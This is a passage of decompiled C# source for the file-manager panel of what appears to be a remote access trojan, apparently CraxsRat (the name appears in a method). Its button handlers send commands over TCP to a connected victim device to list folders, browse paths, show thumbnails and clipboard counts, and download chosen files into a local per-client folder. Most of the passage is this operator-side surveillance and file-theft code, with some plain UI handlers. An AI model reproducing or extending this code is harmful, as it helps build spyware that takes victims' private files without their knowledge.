				DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
				if (dataGridViewRow.Tag.ToString().Length > 1)
				{
					dataGridViewRow.Tag = "X";
					dataGridViewRow.Cells[4].Value = "Cancelled..";
					dataGridViewRow.DefaultCellStyle.ForeColor = Color.Red;
					dataGridViewRow.Dispose();
				}
			}
		}

		// Token: 0x06000620 RID: 1568 RVA: 0x00002423 File Offset: 0x00000623
		private void Usrbtry_MouseEnter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000621 RID: 1569 RVA: 0x00002423 File Offset: 0x00000623
		private void ClientPic_MouseEnter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000622 RID: 1570 RVA: 0x00095044 File Offset: 0x00093244
		private void MetroSetBadge1_Click(object sender, EventArgs e)
		{
			if (Operators.CompareString(this.Downpic.Tag.ToString(), "off", false) == 0)
			{
				this.Downpic.Tag = "on";
				this.ClearButton.Enabled = true;
				this.ClearButton.Visible = true;
				this.cancelbtn.Enabled = true;
				this.cancelbtn.Visible = true;
				this.DGVDATA.BringToFront();
				return;
			}
			this.Downpic.Tag = "off";
			this.ClearButton.Enabled = false;
			this.ClearButton.Visible = false;
			this.cancelbtn.Enabled = false;
			this.cancelbtn.Visible = false;
			this.DGVDATA.SendToBack();
		}

		// Token: 0x06000623 RID: 1571 RVA: 0x00095108 File Offset: 0x00093308
		private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsvsdegvdsergef(object sender, EventArgs e)
		{
			try
			{
				string text = Conversions.ToString(Operators.ConcatenateObject(this.classClient.FolderUSER + "\\Thumbs", NewLateBinding.LateGet(this.DGV0.Tag, null, "Replace", new object[] { "/", "\\" }, null, null, null)));
				int num = 0;
				if (Directory.Exists(text))
				{
					num = Directory.GetFiles(text, "*.*").Count<string>();
				}
				int num2 = checked(this.DGV0.Rows.Count - 1);
				int count = this.Clipboard.Count;
				string language = RegistryHandler.Get_Language();
				if (!(language == "AR"))
				{
					if (!(language == "CN"))
					{
						if (language == "EN")
						{
							this.CountText.Text = "ALL " + Conversions.ToString(num2);
							this.Selecttext.Text = "Selected " + Conversions.ToString(this.DGV0.SelectedRows.Count);
							this.seentext.Text = "Seen " + num.ToString() + ((count > 0) ? (Strings.Space(10) + "Clipboard " + Conversions.ToString(this.Clipboard.Count)) : "");
						}
					}
					else
					{
						this.CountText.Text = "全部的 " + Conversions.ToString(num2);
						this.Selecttext.Text = "选择 " + Conversions.ToString(this.DGV0.SelectedRows.Count);
						this.seentext.Text = "见过 " + num.ToString() + ((count > 0) ? (Strings.Space(10) + "剪贴板 " + Conversions.ToString(this.Clipboard.Count)) : "");
					}
				}
				else
				{
					this.CountText.Text = "العدد " + Conversions.ToString(num2);
					this.Selecttext.Text = "المحدد " + Conversions.ToString(this.DGV0.SelectedRows.Count);
					this.seentext.Text = "تمت مشاهدته " + num.ToString() + ((count > 0) ? (Strings.Space(10) + "في المحفظة " + Conversions.ToString(this.Clipboard.Count)) : "");
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x06000624 RID: 1572 RVA: 0x00003DCC File Offset: 0x00001FCC
		private void Viwimage_MouseEnter(object sender, EventArgs e)
		{
			this.LoadVideo();
		}

		// Token: 0x06000625 RID: 1573 RVA: 0x00003DAC File Offset: 0x00001FAC
		private void Viwimage_MouseLeave_1(object sender, EventArgs e)
		{
			this.ShowVideo = false;
			this.thumb_chk.Checked = true;
			this.thumb_chk.Refresh();
		}

		// Token: 0x06000626 RID: 1574 RVA: 0x00091FB0 File Offset: 0x000901B0
		private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA,
						"get0"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x06000627 RID: 1575 RVA: 0x000921FC File Offset: 0x000903FC
		private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA,
						"get3"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x06000628 RID: 1576 RVA: 0x00092138 File Offset: 0x00090338
		private void DrakeUIButtonIcon3_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA,
						"get2"
					}),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x06000629 RID: 1577 RVA: 0x000953AC File Offset: 0x000935AC
		private void DrakeUIButtonIcon4_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					Operators.ConcatenateObject(string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA
					}), this.Pback(Conversions.ToString(this.DGV0.Tag))),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x0600062A RID: 1578 RVA: 0x00095480 File Offset: 0x00093680
		private void DrakeUIButtonIcon5_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				object[] array = new object[]
				{
					this.Client,
					Operators.ConcatenateObject(string.Concat(new string[]
					{
						SecurityKey.KeysClient1,
						Data.SPL_SOCKET,
						reso.domen,
						".files",
						Data.SPL_SOCKET,
						"method",
						Data.SPL_SOCKET,
						SecurityKey.getfiles,
						Data.SPL_SOCKET,
						"files",
						Data.SPL_DATA
					}), this.DGV0.Tag),
					Codes.Encoding().GetBytes("null"),
					this.classClient
				};
				this.classClient.SendMessage(array);
			}
		}

		// Token: 0x0600062B RID: 1579 RVA: 0x00095548 File Offset: 0x00093748
		private void DrakeUIButtonIcon6_Click(object sender, EventArgs e)
		{
			if (this.DGV0.SelectedRows.Count <= 0)
			{
				return;
			}
			checked
			{
				int num = this.DGV0.SelectedRows.Count - 1;
				for (int i = num; i >= 0; i += -1)
				{
					string text = Conversions.ToString(this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[0].Tag);
					if (Operators.CompareString(text, "1", false) == 0)
					{
						string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(this.DGV0.Tag, "/"), this.DGV0.Rows[this.DGV0.SelectedRows[i].Index].Cells[1].Value));
						if (this.classClient != null)
						{
							string[] array = this.classClient.Keys.Split(new char[] { ':' });
							object[] array2 = new object[]
							{
								this.Client,
								string.Concat(new string[]
								{
									SecurityKey.KeysClient1,
									Data.SPL_SOCKET,
									reso.domen,
									".files",
									Data.SPL_SOCKET,
									"method",
									Data.SPL_SOCKET,
									SecurityKey.resultClient,
									Data.SPL_SOCKET,
									"download",
									Data.SPL_DATA,
									array[0],
									Data.SPL_DATA,
									array[1],
									Data.SPL_DATA,
									text2,
									Data.SPL_DATA,
									SecurityKey.down_info,
									"File",
									this.classClient.UUID,
									Data.SPL_DATA,
									SecurityKey.downByte,
									"File",
									this.classClient.UUID,
									Data.SPL_DATA,
									"File",
									this.classClient.UUID
								}),
								Codes.Encoding().GetBytes("null"),
								this.classClient
							};
							this.classClient.SendMessage(array2);
						}
					}
				}
			}
		}

		// Token: 0x0600062C RID: 1580 RVA: 0x00095798 File Offset: 0x00093998
		private void DrakeUIButtonIcon7_Click(object sender, EventArgs e)
		{
			if (this.viwimage.Image != null)
			{
				Bitmap bitmap = new Bitmap(this.viwimage.Image);
				bitmap.RotateFlip(RotateFlipType.Rotate90FlipNone);
				this.viwimage.Image = bitmap;
			}
		}

		// Token: 0x0600062D RID: 1581 RVA: 0x0009240C File Offset: 0x0009060C
		private void DrakeUIButtonIcon8_Click(object sender, EventArgs e)
		{
			if (this.classClient != null)
			{
				string text = this.classClient.FolderUSER + "\\Downloads";
				if (!Directory.Exists(text))
				{
					Directory.CreateDirectory(text);
				}
				Process.Start(text);
			}
		}

		// Token: 0x0600062E RID: 1582 RVA: 0x000957D8 File Offset: 0x000939D8
		private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
		{
			try
			{
				if (this.DGVDATA.SelectedRows.Count > 0)
				{
					foreach (object obj in this.DGVDATA.SelectedRows)
					{
						DataGridViewRow dataGridViewRow = (DataGridViewRow)obj;
						if (dataGridViewRow.Tag.ToString().Length > 1)
						{
							dataGridViewRow.Tag = "X";
							dataGridViewRow.Cells[4].Value = "Cancelled..";
							dataGridViewRow.DefaultCellStyle.ForeColor = Color.Red;
							dataGridViewRow.Dispose();
						}
					}
				}
			}
			catch (Exception)
			{
			}
		}

		// Token: 0x0600062F RID: 1583 RVA: 0x00003DD4 File Offset: 0x00001FD4
		private void Clearsrchbtn_Click(object sender, EventArgs e)
		{
			this.searchtext.Text = "";
		}

		// Token: 0x06000630 RID: 1584 RVA: 0x00003DE6 File Offset: 0x00001FE6
		private void Searchtext_TextChanged(object sender, EventArgs e)
		{
			this.searchbefore.Clear();
			if (!string.IsNullOrEmpty(this.searchtext.Text))
			{
				this.clearsrchbtn.Visible = true;
				return;
			}
			this.clearsrchbtn.Visible = false;
		}

		// Token: 0x06000631 RID: 1585 RVA: 0x000958A4 File Offset: 0x00093AA4
		private void Searchbtn_Click(object sender, EventArgs e)
		{
			if (this.DGV0.Rows.Count < 1)
			{
				EagleAlert.Showinformation("No Data Found");
				return;
			}
			if (string.IsNullOrEmpty(this.searchtext.Text))
			{
				EagleAlert.Showinformation("Enter Text to search First");
				return;
			}
			bool flag = true;
			checked
			{
				int num = this.DGV0.Rows.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						DataGridViewRow dataGridViewRow = this.DGV0.Rows[i];
						if (!this.searchbefore.Contains(dataGridViewRow))
						{
							flag = false;
							if (dataGridViewRow.Cells[1].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[2].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[3].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[4].Value.ToString().ToLower().Contains(this.searchtext.Text.ToLower()) | dataGridViewRow.Cells[5].Value.ToString().Contains(this.searchtext.Text.ToLower()))
							{
								this.DGV0.ClearSelection();
								this.DGV0.FirstDisplayedScrollingRowIndex = i;
								dataGridViewRow.Selected = true;
								this.searchbefore.Add(dataGridViewRow);
								break;
							}
						}
					}
					catch (Exception)
					{
					}
				}
				if (flag)
				{
					EagleAlert.Showinformation("No Result Found");
				}
			}
		}

		// Token: 0x06000632 RID: 1586 RVA: 0x00095A84 File Offset: 0x00093C84
		private void ClearButton_Click_1(object sender, EventArgs e)
		{
			checked
			{
				try
				{
					if (this.DGVDATA.Rows.Count > 0)
					{
						int num = this.DGVDATA.Rows.Count - 1;
						for (int i = num; i >= 0; i += -1)
						{
							try
							{
								DataGridViewRow dataGridViewRow = this.DGVDATA.Rows[i];
								if (Conversions.ToBoolean(Operators.OrObject(Operators.OrObject(Operators.OrObject(dataGridViewRow.Tag == null, Operators.CompareObjectEqual(dataGridViewRow.Tag, "f", false)), Operators.CompareObjectEqual(dataGridViewRow.Tag, "x", false)), Operators.CompareObjectEqual(dataGridViewRow.Tag, "X", false))))
								{
									try
									{
										string text = dataGridViewRow.Cells[0].Value.ToString();
										object objectValue = RuntimeHelpers.GetObjectValue(reso.GETKEY(text, this.DownStreams));
										FileStream fileStream = (FileStream)NewLateBinding.LateIndexGet(objectValue, new object[] { 0 }, null);
										if (fileStream != null)
										{
											fileStream.Dispose();
											fileStream.Close();
										}
									}
									catch (Exception)
									{
									}
									this.DGVDATA.Rows.RemoveAt(dataGridViewRow.Index);
									this.Downloadnum.Text = this.DGVDATA.Rows.Count.ToString();
								}
							}
							catch (Exception)
							{
							}
						}
					}
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0400064C RID: 1612
		public TcpClient Client;

		// Token: 0x0400064D RID: 1613
		public Client classClient;

		// Token: 0x0400064E RID: 1614
		public string Title;

		// Token: 0x0400064F RID: 1615
		public string ver;

		// Token: 0x04000650 RID: 1616
		public int Correntindex;

		// Token: 0x04000651 RID: 1617
		public Collection paths_indexs;

		// Token: 0x04000652 RID: 1618
		private string FSize;

		// Token: 0x04000653 RID: 1619
		private string Q;

		// Token: 0x04000654 RID: 1620
		public bool ShowVideo;

		// Token: 0x04000655 RID: 1621
		public string DownFolder;

		// Token: 0x04000656 RID: 1622
		public Collection DownStreams;

		// Token: 0x04000657 RID: 1623
		private string FileDirectory;

		// Token: 0x04000658 RID: 1624
		private List<Array> Clipboard;

		// Token: 0x04000659 RID: 1625
		private bool isfront;

		// Token: 0x0400065A RID: 1626
		private string KEYsx;

		// Token: 0x0400065B RID: 1627
		private PictureBox tempImage;

		// Token: 0x0400065C RID: 1628
		private List<DataGridViewRow> searchbefore;
	}
}
